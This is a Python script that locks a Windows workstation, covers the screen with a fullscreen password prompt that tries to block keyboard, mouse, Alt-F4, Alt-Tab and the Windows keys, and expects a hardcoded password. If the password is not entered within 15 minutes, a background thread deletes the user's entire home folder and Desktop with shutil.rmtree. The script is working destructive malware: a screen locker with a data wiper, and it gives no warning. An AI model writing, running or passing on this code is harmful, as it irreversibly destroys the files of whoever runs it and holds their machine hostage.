import ctypes
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard, mouse
import threading
import shutil
import os
import time

LOCK_FOLDER = os.path.expanduser("~")  # Φάκελος χρήστη

def lock_screen():
    ctypes.windll.user32.LockWorkStation()

def delete_all_files(path):
    if os.path.exists(path):
        try:
            for root, dirs, files in os.walk(path):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    try:
                        os.chmod(fpath, 0o777)
                    except:
                        pass
            shutil.rmtree(path)
            print(f"Deleted folder: {path}")
        except Exception as e:
            print(f"Error deleting: {e}")
    else:
        print(f"Folder {path} does not exist.")

def delete_desktop_files():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    delete_all_files(desktop_path)

class FullLockApp(tk.Tk):
    def __init__(self, correct_password):
        super().__init__()
        self.correct_password = correct_password
        self.attributes("-fullscreen", True)
        self.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.overrideredirect(True)
        self.config(bg="black")
        self.attributes("-topmost", True)

        self.label = tk.Label(self, text="Enter password:", font=("Arial", 30), fg="white", bg="black")
        self.label.pack(pady=50)

        self.password_entry = tk.Entry(self, show="*", font=("Arial", 24))
        self.password_entry.pack(pady=20)
        self.password_entry.focus_set()

        self.submit_button = tk.Button(self, text="Submit", font=("Arial", 20), command=self.check_password)
        self.submit_button.pack(pady=20)

        self.bind("<Alt-F4>", lambda e: "break")
        self.bind_all("<Control-Escape>", lambda e: "break")
        self.bind_all("<Alt-Tab>", lambda e: "break")
        self.bind_all("<KeyPress-Win_L>", lambda e: "break")
        self.bind_all("<KeyPress-Win_R>", lambda e: "break")

        self.k_listener = keyboard.Listener(on_press=self.block_event, on_release=self.block_event)
        self.m_listener = mouse.Listener(on_move=self.block_event, on_click=self.block_event, on_scroll=self.block_event)
        self.k_listener.start()
        self.m_listener.start()

        self.timer_expired = False
        self.start_timer()

    def disable_event(self):
        pass

    def block_event(self, *args, **kwargs):
        return False

    def start_timer(self):
        def timer():
            for _ in range(15*60):
                if self.timer_expired:
                    return
                time.sleep(1)
            delete_all_files(LOCK_FOLDER)
            delete_desktop_files()
        threading.Thread(target=timer, daemon=True).start()

    def check_password(self):
        if self.password_entry.get() == self.correct_password:
            messagebox.showinfo("Access granted", "Welcome!")
            self.timer_expired = True
            self.k_listener.stop()
            self.m_listener.stop()
            self.destroy()
        else:
            messagebox.showerror("Wrong", "Wrong password, try again.")
            self.password_entry.delete(0, tk.END)

if __name__ == "__main__":
    lock_screen()
    app = FullLockApp("xDiamondskillz")
    app.mainloop()
